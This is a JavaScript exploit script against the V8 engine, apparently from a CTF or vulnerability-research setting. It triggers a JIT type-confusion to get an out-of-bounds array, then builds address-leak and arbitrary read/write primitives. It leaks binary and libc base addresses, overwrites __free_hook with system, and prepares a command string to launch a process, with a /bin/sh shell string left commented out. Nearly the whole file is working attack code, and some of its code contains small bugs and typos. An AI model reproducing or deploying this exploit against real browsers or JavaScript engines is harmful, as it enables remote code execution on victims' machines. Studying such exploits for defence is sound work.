const MAX_ITERATIONS = 10000;
var max_size = 1020*4;

var buf =new ArrayBuffer(16);
var float64 = new Float64Array(buf);
var bigUint64 = new BigUint64Array(buf);
var uint32 = new Uint32Array(buf);
// Floating point to 64-bit unsigned integer
function f2i(f)
{
    float64[0] = f;
    return bigUint64[0];
}
// 64-bit unsigned integer to Floating point
function i2f(i)
{
    bigUint64[0] = i;
    return float64[0];
}

function f2half(val)
{
    float64[0]= val;
    let tmp = Array.from(uint32);
    return tmp;
}

function half2f(val)
{
    uint32.set(val);
    return float64[0];
}
// 64-bit unsigned integer to hex
function hex(i)
{
    return "0x"+i.toString(16).padStart(16, "0");
}

/*
function wasm_func() {
    var wasmImports = {
        env: {
            puts: function puts (index) {
                print(utf8ToString(h, index));
            }
        }
    };
    
    var buffer = new Uint8Array([0,97,115,109,1,0,0,0,1,137,128,128,128,0,2,
        96,1,127,1,127,96,0,0,2,140,128,128,128,0,1,3,101,110,118,4,112,117,
        116,115,0,0,3,130,128,128,128,0,1,1,4,132,128,128,128,0,1,112,0,0,5,
        131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,146,128,128,128,0,2,6,
        109,101,109,111,114,121,2,0,5,104,101,108,108,111,0,1,10,141,128,128,
        128,0,1,135,128,128,128,0,0,65,16,16,0,26,11,11,146,128,128,128,0,1,0,
        65,16,11,12,72,101,108,108,111,32,87,111,114,108,100,0]);
    let m = new WebAssembly.Instance(new WebAssembly.Module(buffer),wasmImports);
    let h = new Uint8Array(m.exports.memory.buffer);
    return m.exports.hello;  
}
// wasm obj
func = wasm_func();
*/
//%Debugprint(func);
//%SystemBreak();
// gc function to move data to old space
function gc() {
    for (let i = 0; i < 100; i++) {
        new ArrayBuffer(0x100000);
    }
}

function foo(a, b) {
    let tmp = {};
    b[0] = 0;
    a.length;

    for(let i=0; i<a.length; i++){
        a[i] = tmp;
    }
    let o = [1.1];
    b[15] = 4.063e-320; 
    return o;
}

let arr_addr_of = new Array(1);
arr_addr_of[0] = 'a';
// %Debugprint(arr_addr_of);
for(let i=0; i<MAX_ITERATIONS; i++) {
    eval(`var tmp_arr = [1.1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24];`);
    foo(arr_addr_of, [1.1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24]);
    foo(tmp_arr, [1.1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24]);
}
// %SystemBreak();
gc();
// let arr2 =[1.1];
var float_arr = [1.1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24];
// var float_arr = [1.1];;
var oob_array = foo(float_arr, float_arr, {});
var obj_array = {m:0xdead, n:oob_array};
var big_uint_array = new BigUint64Array(6);
big_uint_array[0] = 0x1234n;
big_uint_array[1] = 0x5678n;
print("[+] now oob array's length: " + hex(oob_array.length));
// looking for obj element offset 
var float_object_idx = 0;
for(let i=0; i<max_size/2; i++) {
    if(f2half(oob_array[i])[1] == 0xdead<<1) {
        float_object_idx = i + 1;
        print("[+] float idx of object is: "+hex(float_object_idx));
        break;
    }
} 

// looking for the idx of big uint array
var float_array_big_base_idx = 0;
var float_array_big_external_idx = 0;
var floag_array_big_len_idx = 0;
for(let i=0; i<max_size/2; i++) {
    if(f2i(oob_array[i]) == 0x1234n) {

        float_array_big_len_idx = i+10;
        float_array_big_external_idx = i + 11;
        float_array_big_base_idx = i + 12;
        print("[+] float idx of big uint array len is: "+hex(float_array_big_base_idx));
        print("[+] float idx of big uint array base addr is: "+hex(float_array_big_base_idx));
        print("[+] float idx of big uint array external addr is: "+hex(float_array_big_external_idx));
        break;
    }
}

function Addr_of(obj)
{
    obj_array.n = obj;
    let addr = f2half(oob_array[float_object_idx])[0];
    return BigInt(addr)
}

var big_uint_array_len = f2i(oob_array[float_array_big_len_idx]);
var big_uint_array_base_ptr = f2i(oob_array[float_array_big_base_idx]);
var big_uint_array_external_ptr = f2i(oob_array[float_array_big_external_idx]);

var compress_heap_high_addr = big_uint_array_external_ptr & 0xffffffff00000000n;
print ("[+] heap high addr: " + hex(compress_heap_high_addr));


function In_heap_read64(addr)
{
    oob_array[float_array_big_base_idx] = i2f(addr-0x8n);
    let val = big_uint_array[0];
    oob_array[float_array_big_base_idx] = i2f(big_uint_array_base_ptr);
    return val;

}

function In_heap_write64(addr, val)
{

    oob_array[float_array_big_external_idx] = i2f(addr-0x8n);
    big_uint_array[0] = val;
    oob_array[float_array_big_external_idx] = i2f(big_uint_array_external_ptr);
    return;
}

function Byte_to_big_int_array(payload)
{

    let sc = []
    let tmp = 0n;
    let len = BigInt(Math.ceil(payload.length/8))
    for (let i = 0n; i < len; i += 1n) {
        tmp = 0n;
        for(let j=0n; j<8n; j++){
            let c = payload[i*8n+j]
            if(c === undefined) {
                c = 0;
            }
            tmp += BigInt(c)*(0x1n<<(8n*j));
        }
        sc.push(tmp);
    }
    return sc;
}

function In_heap_write(addr, payload)
{
    let sc = Byte_to_big_int_array(payload);

    oob_array[float_array_big_len_idx] = i2f(sc.length);
    oob_array[float_array_big_base_idx] = i2f(addr-0x8n);

    for(let i = 0; i<sc.length; i+=i) {
        big_uint_array[i] = sc[i];
    }
    
    oob_array[float_array_big_base_idx] = i2f(big_uint_array_base_ptr);
    oob_array[float_array_big_len_idx] = big_uint_array_len;
}

function Arbitraty_read64(addr) 
{
    oob_array[float_array_big_base_idx] = i2f(0n);
    oob_array[float_array_big_external_idx] = i2f(addr);
    let val = big_uint_array[0];
    oob_array[float_array_big_base_idx] = i2f(big_uint_array_base_ptr);
    oob_array[float_array_big_external_idx] = i2f(big_uint_array_external_ptr);
    return val;
}

function Arbitraty_write64(addr, val) 
{
    oob_array[float_array_big_base_idx] = i2f(0n);
    oob_array[float_array_big_external_idx] = i2f(addr);
    big_uint_array[0] = val;
    oob_array[float_array_big_base_idx] = i2f(big_uint_array_base_ptr);
    oob_array[float_array_big_external_idx] = i2f(big_uint_array_external_ptr);
}

function Arbitraty_write(addr, payload)
{

    let sc = Byte_to_big_int_array(payload);

    oob_array[float_array_big_len_idx] = i2f(BigInt(sc.length));
    oob_array[float_array_big_base_idx] = i2f(0n);
    oob_array[float_array_big_external_idx] = i2f(addr);
    for(let i = 0; i<sc.length; i+=1) {
        big_uint_array[i] = sc[i];
    }

    oob_array[float_array_big_len_idx] = big_uint_array_len;
    oob_array[float_array_big_base_idx] = big_uint_array_base_ptr;
    oob_array[float_array_big_external_idx] = big_uint_array_external_ptr;
}

function get_shell()
{
    let get_shell_buffer = new ArrayBuffer(0x1000);
    let get_shell_dataview = new DataView(get_shell_buffer);
    //get_shell_dataview.setFloat64(0, i2f(0x0068732f6e69622fn), true); // str --> /bin/sh\x00
    get_shell_dataview.setFloat64(0, i2f(0x69622f70616e732fn), true); // /snap/bi
    get_shell_dataview.setFloat64(8, i2f(0x2d656d6f6e672f6en), true); // n/gnome-
    get_shell_dataview.setFloat64(16, i2f(0x74616c75636c6163n), true); // calculat
    get_shell_dataview.setFloat64(24, i2f(0x726fn), true); // or
    //%DebugPrint(get_shell_dataview);
    //%SystemBreak();


}

var arr = [1.1, 2.2, 3.3];
var arr_addr = Addr_of(arr.constructor);
print("[+] float arr constructor addr: "+hex(arr_addr));
var code_addr = In_heap_read64(arr_addr + 4n*6n)&0xffffffffn;
print("[+] code obj addr: "+hex(code_addr));
var text_addr = In_heap_read64(code_addr + 0x42n)&0xffffffffffffn;
print("[+] text addr: "+hex(text_addr));
var text_base = text_addr - 0x1212440n;
print("[+] text base: "+hex(text_base));
var free_got = text_base + 0x1537250n;
var free_addr = Arbitraty_read64(free_got);
var libc_base = free_addr - 0x979c0n;
print("[+] libc base: "+hex(libc_base));
var free_hook = libc_base + 0x3ed8e8n;
var system_addr = libc_base + 0x4f4e0n;
Arbitraty_write64(free_hook, system_addr);
get_shell();


